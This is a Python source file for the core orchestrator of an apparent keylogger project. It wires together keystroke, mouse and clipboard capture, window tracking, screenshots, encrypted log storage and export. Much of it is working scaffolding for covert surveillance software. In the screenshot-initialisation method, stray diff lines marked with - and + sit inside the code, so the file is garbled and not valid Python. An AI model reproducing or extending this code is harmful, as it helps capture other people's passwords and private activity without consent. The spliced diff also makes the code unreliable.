"""Main KeyloggerCore orchestrator that coordinates all keylogger components."""

import os
import sys
import time
import threading
import logging
import signal
from typing import Dict, Any, Optional, List
from pathlib import Path

# Import core modules
from .config_manager import ConfigManager
from .encryption_manager import EncryptionManager
from .logging_manager import LoggingManager

# Import listeners (will be imported dynamically to handle missing modules)
try:
    sys.path.append(str(Path(__file__).parent.parent))
    from listeners.keyboard_listener import KeyboardListener
    from listeners.mouse_listener import MouseListener
    from listeners.clipboard_listener import ClipboardListener
except ImportError as e:
    logging.warning(f"Some listeners could not be imported: {e}")
    KeyboardListener = None
    MouseListener = None
    ClipboardListener = None

# Import utilities (Window Monitor)
try:
    from utils.window_monitor import WindowMonitor
except Exception as e:
    logging.warning(f"WindowMonitor import failed: {e}")
    WindowMonitor = None

# Import utilities (Screenshot Monitor)
try:
    from utils.screenshot_monitor import ScreenshotMonitor
except Exception as e:
    logging.warning(f"ScreenshotMonitor import failed: {e}")
    ScreenshotMonitor = None

logger = logging.getLogger(__name__)


class KeyloggerCore:
    """Main keylogger orchestrator that manages all components."""
    
    def __init__(self, config_path: Any = None):
        """Initialize the keylogger core.
        Accepts either a path to a config file or a ConfigManager-like object (with get/reload_config methods).
        """
        # Configuration handling (allow passing a ConfigManager-like object)
        self.config_path = None
        self.config_manager = None
        if config_path is None or isinstance(config_path, str):
            self.config_path = config_path or "config.json"
        else:
            # Injected config manager
            self.config_manager = config_path
            # Try to infer path if available
            self.config_path = getattr(config_path, 'config_file', "config.json")
        
        # Runtime state
        self._is_running = False
        self.start_time = None
        self.session_id = None
        self.config = None  # Backward-compat convenience alias
        
        # Core components
        # self.config_manager may have been injected above
        self.encryption_manager = None
        self.logging_manager = None
        
        # Listeners / Utilities
        self.keyboard_listener = None
        self.mouse_listener = None
        self.clipboard_listener = None
        self.window_monitor = None
        self.screenshot_monitor = None
        
        # Threading
        self.main_thread = None
        self.stop_event = threading.Event()
        self.window_thread = None
        self.screenshot_thread = None
        
        # Statistics
        self.stats = {
            'start_time': None,
            'total_events': 0,
            'keyboard_events': 0,
            'mouse_events': 0,
            'clipboard_events': 0,
            'errors': 0,
            'uptime_seconds': 0
        }
        
        # Session statistics for tracking current session state
        self.session_stats = {
            'active_window': 'Unknown',
            'active_application': 'Unknown',
            'session_start_time': None,
            'last_activity_time': None,
            'window_changes': 0,
            'total_keystrokes': 0,
            'total_mouse_clicks': 0,
            'clipboard_changes': 0
        }
        
        # Initialize components
        self._initialize_components()
        
        # Initialize listeners and utilities during construction as tests expect
        self._initialize_listeners()
        self._initialize_utilities()
    
    def _initialize_components(self) -> bool:
        """Initialize all core components."""
        try:
            logger.info("Initializing keylogger core components...")
            
            # Initialize configuration manager if not injected
            if self.config_manager is None:
                self.config_manager = ConfigManager(self.config_path)
                if not self.config_manager.load_config():
                    logger.error("Failed to load configuration")
                    return False
            
            # Set config alias for backward compatibility
            self.config = self.config_manager
            
            # Initialize encryption manager
            self.encryption_manager = EncryptionManager()
            if not getattr(self.encryption_manager, 'init_encryption', lambda: True)():
                logger.warning("Encryption manager initialization failed, continuing without encryption")
            
            # Initialize logging manager
            self.logging_manager = LoggingManager(self.config_manager, self.encryption_manager)
            
            # Generate session ID
            self.session_id = f"session_{int(time.time())}_{os.getpid()}"
            
            logger.info("Core components initialized successfully")
            return True
            
        except Exception as e:
            logger.error(f"Error initializing components: {e}")
            return False
    
    def _initialize_listeners(self) -> bool:
        """Initialize event listeners based on configuration."""
        try:
            logger.info("Initializing event listeners...")
            
            # Read feature flags with backward-compatible keys
            kb_enabled = self.config_manager.get('features.keyboard', self.config_manager.get('features.keyboard_logging', True))
            mouse_enabled = self.config_manager.get('features.mouse', self.config_manager.get('features.mouse_logging', True))
            clip_enabled = self.config_manager.get('features.clipboard', self.config_manager.get('features.clipboard_logging', False))
            
            # Initialize keyboard listener
            if kb_enabled and KeyboardListener is not None:
                try:
                    self.keyboard_listener = KeyboardListener(self)
                    logger.info("Keyboard listener initialized")
                except Exception as e:
                    logger.error(f"Failed to initialize keyboard listener: {e}")
            
            # Initialize mouse listener
            if mouse_enabled and MouseListener is not None:
                try:
                    self.mouse_listener = MouseListener(self)
                    logger.info("Mouse listener initialized")
                except Exception as e:
                    logger.error(f"Failed to initialize mouse listener: {e}")
            
            # Initialize clipboard listener
            if clip_enabled and ClipboardListener is not None:
                try:
                    self.clipboard_listener = ClipboardListener(self)
                    logger.info("Clipboard listener initialized")
                except Exception as e:
                    logger.error(f"Failed to initialize clipboard listener: {e}")
            
            return True
            
        except Exception as e:
            logger.error(f"Error initializing listeners: {e}")
            return False
    
    def _initialize_utilities(self) -> None:
        """Initialize utility components like WindowMonitor based on configuration."""
        try:
            win_enabled = self.config_manager.get('features.window_tracking', True)
            if win_enabled and WindowMonitor is not None:
                try:
                    self.window_monitor = WindowMonitor(self)
                    logger.info("Window monitor initialized")
                except Exception as e:
                    logger.error(f"Failed to initialize window monitor: {e}")

            # Initialize screenshot monitor if enabled
            # Initialize screenshot monitor if enabled
            -            shots_enabled = self.config_manager.get('features.screenshots', False)
            -            if shots_enabled and ScreenshotMonitor is not None:
            -                try:
            -                    self.screenshot_monitor = ScreenshotMonitor(self)
            -                    logger.info("Screenshot monitor initialized")
            -                except Exception as e:
            -                    logger.error(f"Failed to initialize screenshot monitor: {e}")
            +            # Support multiple configuration keys for enabling screenshots
            +            shots_enabled = bool(
            +                self.config_manager.get('features.screenshots', False) or
            +                self.config_manager.get('features.screenshot_capture', False) or
            +                self.config_manager.get('screenshots.enabled', False)
            +            )
            +            if shots_enabled and ScreenshotMonitor is not None:
            +                try:
            +                    self.screenshot_monitor = ScreenshotMonitor(self)
            +                    logger.info("Screenshot monitor initialized")
            +                except Exception as e:
            +                    logger.error(f"Failed to initialize screenshot monitor: {e}")
            except Exception as e:
                logger.error(f"Error initializing utilities: {e}")
    
    def start(self) -> bool:
        """Start the keylogger."""
        try:
            if self._is_running:
                logger.warning("Keylogger is already running")
                return True
            
            logger.info("Starting keylogger...")
            
            # Initialize listeners (ensure initialized)
            if not self._initialize_listeners():
                logger.error("Failed to initialize listeners")
                return False
            
            # Set up signal handlers
            self._setup_signal_handlers()
            
            # Ensure stop flag is cleared before starting threads
            self.stop_event.clear()
            
            # Start listeners
            self._start_listeners()
            
            # Start utility monitors (e.g., window, screenshots)
            self._start_utilities()
            
            # Update state
            self._is_running = True
            self.start_time = time.time()
            self.stats['start_time'] = self.start_time
            
            # Initialize session stats
            self.session_stats['session_start_time'] = self.start_time
            self.session_stats['last_activity_time'] = self.start_time
            
            # Log startup event
            self.log_event('system', 'keylogger_started', metadata={
                'session_id': self.session_id,
                'config_file': self.config_path,
                'features': {
                    'keyboard': self.keyboard_listener is not None,
                    'mouse': self.mouse_listener is not None,
                    'clipboard': self.clipboard_listener is not None
                }
            })
            
            logger.info(f"Keylogger started successfully (Session: {self.session_id})")
            return True
            
        except Exception as e:
            logger.error(f"Error starting keylogger: {e}")
            self.stats['errors'] += 1
            return False
    
    def _setup_signal_handlers(self) -> None:
        """Set up signal handlers for graceful shutdown."""
        try:
            signal.signal(signal.SIGINT, self._signal_handler)
            signal.signal(signal.SIGTERM, self._signal_handler)
            if hasattr(signal, 'SIGBREAK'):
                signal.signal(signal.SIGBREAK, self._signal_handler)
        except Exception as e:
            logger.warning(f"Could not set up signal handlers: {e}")
    
    def _signal_handler(self, signum, frame):
        """Handle shutdown signals."""
        logger.info(f"Received signal {signum}, shutting down gracefully...")
        self.stop()
    
    def _start_listeners(self) -> None:
        """Start all initialized listeners."""
        try:
            if self.keyboard_listener:
                self.keyboard_listener.start()
                logger.info("Keyboard listener started")
            
            if self.mouse_listener:
                self.mouse_listener.start()
                logger.info("Mouse listener started")
            
            if self.clipboard_listener:
                self.clipboard_listener.start()
                logger.info("Clipboard listener started")
                
        except Exception as e:
            logger.error(f"Error starting listeners: {e}")
            self.stats['errors'] += 1

    def _start_utilities(self) -> None:
        """Start background utility monitors (window tracking, screenshots)."""
        try:
            if self.window_monitor and (self.window_thread is None or not self.window_thread.is_alive()):
                self.window_thread = threading.Thread(target=self.window_monitor.run, name="WindowMonitorThread", daemon=True)
                self.window_thread.start()
                logger.info("Window monitor thread started")
            
            if self.screenshot_monitor and (self.screenshot_thread is None or not self.screenshot_thread.is_alive()):
                self.screenshot_thread = threading.Thread(target=self.screenshot_monitor.run, name="ScreenshotMonitorThread", daemon=True)
                self.screenshot_thread.start()
                logger.info("Screenshot monitor thread started")
        except Exception as e:
            logger.error(f"Error starting utility monitors: {e}")
    
    def stop(self) -> bool:
        """Stop the keylogger."""
        try:
            if not self._is_running:
                logger.warning("Keylogger is not running")
                return True
            
            logger.info("Stopping keylogger...")
            
            # Set stop flag
            self._is_running = False
            self.stop_event.set()
            
            # Stop listeners
            self._stop_listeners()

            # Stop utility monitors
            self._stop_utilities()
            
            # Log shutdown event
            uptime = time.time() - self.start_time if self.start_time else 0
            self.log_event('system', 'keylogger_stopped', metadata={
                'session_id': self.session_id,
                'uptime_seconds': uptime,
                'total_events': self.stats['total_events']
            })
            
            # Stop logging manager
            if self.logging_manager:
                self.logging_manager.stop()
            
            logger.info("Keylogger stopped successfully")
            return True
            
        except Exception as e:
            logger.error(f"Error stopping keylogger: {e}")
            return False

    def _stop_listeners(self) -> None:
        """Stop all listeners."""
        try:
            if self.keyboard_listener:
                self.keyboard_listener.stop()
                logger.info("Keyboard listener stopped")
            
            if self.mouse_listener:
                self.mouse_listener.stop()
                logger.info("Mouse listener stopped")
            
            if self.clipboard_listener:
                self.clipboard_listener.stop()
                logger.info("Clipboard listener stopped")
                
        except Exception as e:
            logger.error(f"Error stopping listeners: {e}")

    def _stop_utilities(self) -> None:
        """Stop background utility monitors and wait for their threads to finish."""
        try:
            # Hint the screenshot monitor to exit immediately
            if self.screenshot_monitor is not None:
                try:
                    self.screenshot_monitor.is_running = False
                except Exception:
                    pass
            
            # Join threads briefly (they watch stop_event to terminate)
            if self.window_thread and self.window_thread.is_alive():
                self.window_thread.join(timeout=2.0)
            if self.screenshot_thread and self.screenshot_thread.is_alive():
                self.screenshot_thread.join(timeout=2.0)
        except Exception as e:
            logger.error(f"Error stopping utility monitors: {e}")
    
    def is_running(self) -> bool:
        """Return whether the keylogger is currently running."""
        return self._is_running
    
    def log_event(self, event_type: str, content: Any, window: Optional[str] = None, metadata: Dict[str, Any] = None) -> bool:
        """Log an event through the logging manager.
        Signature: (event_type, content, window=None, metadata=None) for backward compatibility with tests.
        """
        try:
            if not self.logging_manager:
                return False
            
            # Add session info to metadata
            if metadata is None:
                metadata = {}
            metadata['session_id'] = self.session_id
            
            # Get current window if not provided
            if window is None:
                window = self._get_current_window()
            
            # Log the event
            success = self.logging_manager.log_event(event_type, content, window, metadata)
            
            if success:
                self.stats['total_events'] += 1
                
                # Update specific event counters
                if event_type == 'keyboard':
                    self.stats['keyboard_events'] += 1
                elif event_type == 'mouse':
                    self.stats['mouse_events'] += 1
                elif event_type == 'clipboard':
                    self.stats['clipboard_events'] += 1
            
            return success
            
        except Exception as e:
            logger.error(f"Error logging event: {e}")
            self.stats['errors'] += 1
            return False
    
    def _get_current_window(self) -> str:
        """Get the current active window title."""
        try:
            import psutil
            import win32gui
            import win32process
            
            # Get foreground window
            hwnd = win32gui.GetForegroundWindow()
            if hwnd:
                # Get window title
                window_title = win32gui.GetWindowText(hwnd)
                
                # Get process info
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                try:
                    process = psutil.Process(pid)
                    process_name = process.name()
                    return f"{process_name} - {window_title}"
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    return window_title or "Unknown Window"
            
            return "Unknown Window"
            
        except ImportError:
            # Fallback for systems without win32 modules
            return "Unknown Window"
        except Exception as e:
            logger.debug(f"Error getting window info: {e}")
            return "Unknown Window"
    
    def update_active_window(self, window_name: str, process_name: Optional[str] = None) -> None:
        """Update session stats with the currently active window.
        Called by WindowMonitor when a window change is detected.
        """
        try:
            prev_window = self.session_stats.get('active_window')
            # Normalize and assign
            new_window = window_name or 'Unknown'
            if new_window != prev_window:
                # Count only real changes
                try:
                    self.session_stats['window_changes'] = int(self.session_stats.get('window_changes', 0)) + 1
                except Exception:
                    self.session_stats['window_changes'] = 1
            self.session_stats['active_window'] = new_window
            if process_name:
                self.session_stats['active_application'] = process_name
            # Update last activity time on any window update
            self.session_stats['last_activity_time'] = time.time()
        except Exception as e:
            logger.debug(f"Failed to update active window: {e}")
    def get_stats(self) -> Dict[str, Any]:
        """Get keylogger statistics as a flat dictionary (backward compatible)."""
        try:
            current_time = time.time()
            
            # Update uptime
            if self.start_time:
                self.stats['uptime_seconds'] = current_time - self.start_time
            
            return self.stats.copy()
            
        except Exception as e:
            logger.error(f"Error getting stats: {e}")
            return {'error': str(e)}

    def get_session_stats(self) -> Dict[str, Any]:
        """Get structured session statistics for the web UI and APIs."""
        try:
            current_time = time.time()
            uptime = (current_time - self.start_time) if self.start_time else 0

            return {
                'session_id': self.session_id,
                'running': bool(self._is_running),
                'start_time': self.start_time,
                'uptime': int(uptime),
                'total_events': int(self.stats.get('total_events', 0)),
                'keyboard_events': int(self.stats.get('keyboard_events', 0)),
                'mouse_events': int(self.stats.get('mouse_events', 0)),
                'clipboard_events': int(self.stats.get('clipboard_events', 0)),
                'errors': int(self.stats.get('errors', 0)),
                'active_window': self.session_stats.get('active_window', 'Unknown'),
                'active_application': self.session_stats.get('active_application', 'Unknown'),
                'window_changes': int(self.session_stats.get('window_changes', 0)),
                'last_activity_time': self.session_stats.get('last_activity_time')
            }
        except Exception as e:
            logger.error(f"Error getting session stats: {e}")
            return {
                'session_id': self.session_id,
                'running': bool(self._is_running),
                'uptime': 0,
                'total_events': 0,
                'errors': 0,
                'error': str(e)
            }
    def reload_config(self) -> bool:
        """Reload configuration and restart components if needed."""
        try:
            logger.info("Reloading configuration...")
            
            # Reload config manager (tests expect reload_config to be called)
            if hasattr(self.config_manager, 'reload_config'):
                if not self.config_manager.reload_config():
                    logger.error("Failed to reload configuration")
                    return False
            else:
                # Fallback to load_config if reload not available
                if not self.config_manager.load_config():
                    logger.error("Failed to reload configuration via load_config")
                    return False
            
            # Reload logging manager config
            if self.logging_manager and hasattr(self.logging_manager, 'reload_config'):
                self.logging_manager.reload_config()
            
            # Log config reload event
            self.log_event('system', 'config_reloaded', metadata={
                'config_file': self.config_path
            })
            
            logger.info("Configuration reloaded successfully")
            return True
            
        except Exception as e:
            logger.error(f"Error reloading configuration: {e}")
            return False
    
    def export_logs(self, output_file: str, format_type: str = 'json', 
                   start_time: float = None, end_time: float = None) -> bool:
        """Export logs using the logging manager."""
        try:
            if not self.logging_manager:
                logger.error("Logging manager not initialized")
                return False
            
            return self.logging_manager.export_logs(output_file, format_type, start_time, end_time)
            
        except Exception as e:
            logger.error(f"Error exporting logs: {e}")
            return False
    
    def run_interactive(self) -> None:
        """Run keylogger in interactive mode with command interface."""
        try:
            if not self.start():
                logger.error("Failed to start keylogger")
                return
            
            print("\n" + "="*50)
            print("Enhanced Keylogger - Interactive Mode")
            print("="*50)
            print(f"Session ID: {self.session_id}")
            print("Commands: stats, export, reload, stop, help")
            print("Press Ctrl+C to stop\n")
            
            while self._is_running:
                try:
                    command = input("> ").strip().lower()
                    
                    if command == 'stats':
                        self._print_stats()
                    elif command.startswith('export'):
                        self._handle_export_command(command)
                    elif command == 'reload':
                        self.reload_config()
                        print("Configuration reloaded")
                    elif command == 'stop':
                        break
                    elif command == 'help':
                        self._print_help()
                    elif command == '':
                        continue
                    else:
                        print(f"Unknown command: {command}. Type 'help' for available commands.")
                        
                except KeyboardInterrupt:
                    break
                except EOFError:
                    break
                except Exception as e:
                    print(f"Error processing command: {e}")
            
            self.stop()
            print("\nKeylogger stopped. Goodbye!")
            
        except Exception as e:
            logger.error(f"Error in interactive mode: {e}")
    
    def _print_stats(self) -> None:
        """Print current statistics."""
        try:
            stats = self.get_stats()
            
            print("\n" + "-"*30 + " STATISTICS " + "-"*30)
            print(f"Session ID: {self.session_id}")
            print(f"Running: {self._is_running}")
            print(f"Uptime: {stats.get('uptime_seconds', 0):.1f} seconds")
            print(f"Total Events: {stats.get('total_events', 0)}")
            print(f"Keyboard Events: {stats.get('keyboard_events', 0)}")
            print(f"Mouse Events: {stats.get('mouse_events', 0)}")
            print(f"Clipboard Events: {stats.get('clipboard_events', 0)}")
            print(f"Errors: {stats.get('errors', 0)}")
            
            # Logging manager stats if available
            if self.logging_manager:
                lm_stats = getattr(self.logging_manager, 'get_stats', lambda: {})()
                print(f"\nLogging Buffer Size: {lm_stats.get('buffer_size', 0)}")
                print(f"Events Written: {lm_stats.get('events_written', 0)}")
                print(f"Events Encrypted: {lm_stats.get('events_encrypted', 0)}")
                print(f"Log File Size: {lm_stats.get('log_file_size_mb', 0):.2f} MB")
            
            print("-"*73 + "\n")
            
        except Exception as e:
            print(f"Error displaying stats: {e}")
    
    def _handle_export_command(self, command: str) -> None:
        """Handle export command."""
        try:
            parts = command.split()
            if len(parts) < 2:
                print("Usage: export <filename> [format]")
                print("Formats: json, csv, text")
                return
            
            filename = parts[1]
            format_type = parts[2] if len(parts) > 2 else 'json'
            
            if self.export_logs(filename, format_type):
                print(f"Exported logs to {filename} ({format_type})")
            else:
                print("Failed to export logs")
            
        except Exception as e:
            print(f"Error exporting logs: {e}")
    
    def _print_help(self) -> None:
        print("Available commands:\n - stats\n - export <filename> [format]\n - reload\n - stop\n - help")